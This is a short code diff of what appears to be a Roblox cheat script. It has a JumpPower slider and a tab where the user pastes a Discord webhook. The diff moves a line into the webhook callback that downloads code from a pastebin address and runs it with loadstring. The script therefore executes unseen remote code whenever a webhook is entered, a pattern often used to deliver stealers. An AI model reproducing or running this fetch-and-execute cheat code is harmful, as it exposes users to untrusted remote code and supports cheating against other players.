@@ -24,14 +24,10 @@ Misc:NewSlider("Jump", "Change Player JumpPower", 500, 0, function(s) -- 500 (Ma
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
 end)
 
-
-
 local Webhook = Window:NewTab("Webhook")
 local Webhook = Webhook:NewSection("Webhook")
 
 Webhook:NewTextBox("Paste your Discord Webhook", "Paste here", function(txt)
 	_G.Webhook = txt
-}
-
-loadstring(game:HttpGet('https://pastebin.com/raw/H9DyZWys'))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/H9DyZWys'))()
 end)
